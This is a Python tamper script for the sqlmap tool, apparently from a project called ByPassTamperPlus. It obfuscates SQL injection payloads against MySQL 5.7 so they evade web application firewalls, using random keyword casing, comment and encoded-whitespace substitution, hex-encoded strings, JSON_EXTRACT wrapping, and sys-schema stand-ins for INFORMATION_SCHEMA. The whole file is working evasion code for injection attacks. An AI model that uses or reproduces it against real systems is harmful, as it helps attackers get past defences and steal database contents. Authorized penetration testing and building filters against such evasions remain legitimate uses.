#!/usr/bin/env python

"""
@Project  : ByPassTamperPlus
@File     : mysql57_bypass.py
@Author   : Tas9er / https://www.github.com/Tas9er
@IDE      : PyCharm
"""

import re
import random

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    pass

def tamper(payload, **kwargs):
    if not payload:
        return payload

    def random_case(word):
        return "".join(c.upper() if random.getrandbits(1) else c.lower() for c in word)

    def general_obfuscate(p):
        keywords = [
            "SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "GROUP_CONCAT", "CONCAT",
            "INFORMATION_SCHEMA", "TABLES", "COLUMNS", "TABLE_NAME", "COLUMN_NAME",
            "USER", "CURRENT_USER", "DATABASE", "AS", "LIMIT", "OFFSET", "VERSION",
            "JSON_EXTRACT", "JSON_ARRAYAGG", "SYS", "SCHEMA_TABLE_STATISTICS",
            "SCHEMA_OBJECT_OVERVIEW"
        ]
        for kw in keywords:
            p = re.sub(r"(?i)\b%s\b" % kw, lambda m: random_case(m.group(0)), p)

        p = re.sub(r"(?i)SUBSTRING\(", lambda m: random_case(random.choice(["MID(", "SUBSTR("])), p)

        spaces = ["/**/", "%0a", "%09", "%0b", "%0c", "+", "/*%00*/", "()", "%a0"]
        p = re.sub(r" ", lambda m: random.choice(spaces), p)

        p = re.sub(r"'([^']*)'", lambda m: "0x" + m.group(1).encode("utf-8").hex(), p)

        return p

    if "GROUP_CONCAT" in payload.upper():
        payload = re.sub(r"(?i)GROUP_CONCAT\((.*?)\)", r"JSON_ARRAYAGG(\1)", payload)

    payload = re.sub(r"(?i)INFORMATION_SCHEMA\.TABLES", "sys.schema_table_statistics", payload)
    payload = re.sub(r"(?i)INFORMATION_SCHEMA\.COLUMNS", "sys.schema_object_overview", payload)

    def json_wrap_string(match):
        string = match.group(1)
        hex_str = "0x" + string.encode("utf-8").hex()
        return "JSON_EXTRACT(CONCAT(0x7b2261223a, %s, 0x7d), 0x242e61)" % hex_str

    payload = re.sub(r"'([^']*)'", json_wrap_string, payload)

    payload = general_obfuscate(payload)

    return payload
